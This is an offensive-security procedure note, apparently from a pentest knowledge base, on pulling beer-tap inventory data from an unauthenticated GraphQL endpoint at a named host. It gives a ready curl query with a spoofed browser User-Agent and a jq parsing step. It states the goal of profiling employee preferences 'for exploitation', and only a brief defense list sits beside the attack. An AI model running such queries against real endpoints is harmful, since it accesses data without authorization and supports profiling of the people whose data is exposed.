---
tags:
  - graphql
  - collection
  - information-disclosure
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/graphql-query-beer-details]]'
platforms:
  - Web
techniques:
  - '[[Data from Information Repositories]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 6b8b3c71-33ec-4a75-88f5-5a4317146d0c
created_at: '2025-12-14T17:25:59.614Z'
updated_at: '2025-12-14T17:25:59.614Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Information Repositories]]'
---
# Query GraphQL for Beer Consumption Data

## Summary

This procedure uses a location code to query detailed beer tap information from an unauthenticated GraphQL endpoint, disclosing brewery, style, ABV, IBU, notes, and remaining percentages.

## Description

Building on location data, this targets the location object with taps edges. It exploits missing authorization, revealing internal perks like beer inventories. Requires prior location code; outcomes provide granular data for profiling employee preferences.

## Requirements

1. Location code from previous query (e.g., "OTT150, 8th Floor")
2. Burp Suite for request crafting
3. JSON body with escaped code
4. Endpoint confirmed responsive

## Defense

Defensive measures and detection strategies:

- Add RBAC to GraphQL resolvers
- Mask sensitive fields in responses
- Monitor for tap/location queries
- Implement query complexity limits

## Objectives

1. Fetch beer details per tap
2. Collect consumption metrics
3. Identify preferences for exploitation

## Instructions

### Step 1: Craft and Send Beer Query

**Context**: Query the location with code to get taps data.

**Command** ([[commands/graphql-query-beer-details]]):
```bash
curl -X POST https://beerify.shopifycloud.com/graphql \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0" \
  -d '{"query": "query location{location(code:\"OTT150, 8th Floor\"){taps{edges{node{percentRemaining, beer{brewery, ibu, style, tastingNotes, beerLogo, abv}}}}}}"}'
```

> Escapes code in query. Expected output: JSON with taps array, e.g., 89% on Brown Ale.

### Step 2: Extract Insights

**Context**: Parse for actionable data.

**Command** (jq parse):
```bash
curl ... | jq '.data.location.taps.edges[].node | {percentRemaining, beer: .beer.brewery + " " + .beer.style}'
```

> Summarizes beers. Expected output: List like {"percentRemaining":89,"beer":"Beau's Brewing Co American-style Brown Ale"}.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Data from Information Repositories]]

### Sub-Techniques


## Commands Used

- [[commands/graphql-query-beer-details]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- graphql
- collection
- information-disclosure
